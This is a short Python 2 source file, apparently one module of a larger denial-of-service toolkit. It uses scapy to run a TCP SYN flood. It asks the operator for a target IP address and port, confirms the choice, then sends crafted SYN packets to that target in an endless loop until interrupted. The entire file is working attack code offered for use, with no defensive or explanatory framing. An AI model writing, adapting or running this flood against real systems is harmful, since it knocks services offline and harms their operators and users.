import util
from scapy.all import *
from dos import DoS

#
# really basic TCP SYN flood
#
__name__='TCP SYN'
class TCPSyn(DoS):
	def __init__(self):
		super(TCPSyn,self).__init__('TCP SYN')

	def initialize(self):
		while True:
			try:
				ip = raw_input('[+] Enter [ip:port]: ')
				tmp = raw_input('[+] Flood host \'%s\'.  Is this correct? '%ip)
				if 'no' in tmp.lower() or not ':' in ip:
					return
				break
			except KeyboardInterrupt:
				return
			except:
				pass
	
		print '[!] Flooding \'%s\'...'%ip
		pkt = IP(dst=ip.split(':')[0])/TCP(sport=15,dport=int(ip.split(':')[1]), window=1000,flags='S')
		try:
			send(pkt, loop=1)	
		except:
			pass
		print '[+] Quit flood.'
